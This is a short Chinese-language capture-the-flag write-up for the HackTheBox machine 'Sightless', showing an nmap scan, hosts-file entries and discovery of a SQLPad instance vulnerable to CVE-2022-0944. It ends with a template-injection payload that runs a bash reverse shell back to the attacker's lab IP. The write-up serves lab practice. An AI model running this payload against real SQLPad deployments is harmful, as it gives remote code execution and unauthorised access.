# Sightless

> 本机 IP:10.10.16.13
> 目标 IP:10.10.11.32

```shell
$ nmap -sSVC 10.10.11.32
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Sightless.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)

$ vi /etc/host
[+] 10.10.11.32 sightless.htb
```

访问 sightless.htb，其中有一个跳转到 http://sqlpad.sightless.htb/

```shell
$ vi /etc/host
[+] 10.10.11.32 sqlpad.sightless.htb
```

访问 http://sqlpad.sightless.htb/ 是一个 SQLPad 组件，搜索存在漏洞 CVE-2022-0944，6.10.1 之前版本存在注入漏洞，可远程执行代码

<!-- [wp](https://blog.csdn.net/m0_52742680/article/details/142123113)，burp抓包可看具体版本为6.10.0 -->

连接 -> Driver:MySQL -> Database 输入 payload:

```sql
{{ process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.16.13/299 0>&1"') }}
```
